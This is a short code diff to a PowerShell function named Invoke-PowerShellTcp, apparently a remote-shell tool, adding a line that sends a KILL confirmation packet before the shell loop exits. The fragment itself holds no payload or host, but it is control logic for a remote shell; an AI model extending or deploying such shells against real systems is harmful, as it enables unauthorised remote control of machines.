@@ -174,6 +174,7 @@ function Invoke-PowerShellTcp
                 Write-ShellPacket @{ "msg_type" = "PONG"; "data" = "" } $stream
             } elseif ($packet.msg_type -eq "KILL") {
                 $killed = $true
+                Write-ShellPacket @{ "msg_type" = "KILL"; "data" = "confirm" } $stream
                 Exit
             }
         }
